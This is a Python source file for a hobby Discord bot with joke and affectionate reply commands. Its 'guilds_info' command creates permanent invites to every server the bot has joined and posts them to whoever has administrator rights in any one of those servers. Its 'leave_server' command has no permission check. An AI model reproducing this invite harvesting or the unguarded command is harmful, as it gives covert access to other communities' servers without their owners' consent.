import discord
from discord.ext import commands
import os

intents = discord.Intents.all()
intents.messages = True  # Ensure the bot can read messages
bot = commands.Bot(command_prefix="!leobot ", intents=intents)

@bot.command(name="via")
async def via(ctx):
    await ctx.send("via my baby girl :heart:")

@bot.command(name="credits")
async def credits(ctx):
    await ctx.send("credits to coder of the bot, owner id: 1184539864360816772")

@bot.command(name="guilds_info")
@commands.has_permissions(administrator=True)
async def guilds_info(ctx):
    guild_count = len(bot.guilds)
    embed = discord.Embed(
        title="Guild Information",
        description=f"The bot is currently in **{guild_count}** guild(s):",
        color=discord.Color.blue()
    )

    for guild in bot.guilds:
        invite_link = None
        # Try to get an invite link for the guild
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).create_instant_invite:
                try:
                    invite = await channel.create_invite(max_age=0, max_uses=0)  # Permanent invite
                    invite_link = invite.url
                    break
                except:
                    continue
        
        # Add the guild name and invite link to the embed
        embed.add_field(
            name=guild.name,
            value=invite_link or "No invite link available",
            inline=False
        )

    # Send the embed
    await ctx.send(embed=embed)

# Error handler if the user lacks permissions
@guilds_info.error
async def guilds_info_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("You don't have the required permissions to run this command.")


@bot.command(name="jakov")
async def jakov(ctx):
    await ctx.send("jakov my ex:rage:")

@bot.event
async def on_message(message):
    # Prevent the bot from responding to its own messages or other bots
    if message.author.bot:
        return

    # Check if the message contains the desired phrases
    content = message.content.lower()
    if "i love you" in content:
        if message.author.name.lower() == "vioxla":
            await message.channel.send("omg tysm babe i love you so much :heart:")
        else:
            await message.channel.send(f"Thank you {message.author.mention} :heart: love you too as a friend!:heart:")
    elif "mat" in content:
        await message.channel.send("disrespect:smiling_face_with_3_hearts:")
    elif "keep leone" in content:
        await message.channel.send("awh man!")

    # Allow commands to process after this event handler
    await bot.process_commands(message)

@bot.command(name="i love you")
async def loveyoutoo(ctx):
    await ctx.send("thank you :heart: love you too")

@bot.command(name="mat")
async def mat(ctx):
    await ctx.send("actually sorry mat I can pay you some money and I take via all for myself:fire::heart:")

@bot.command(name="leave_server")
async def leave_server(ctx):
    # Confirm the bot is leaving the server
    await ctx.send("Goodbye! I'm leaving the server now.")
    # Leave the server
    await ctx.guild.leave()

# Fetch the token from the environment variable
token = os.getenv("DISCORD_TOKEN")

# Run the bot with the token from the environment variable
bot.run(token)
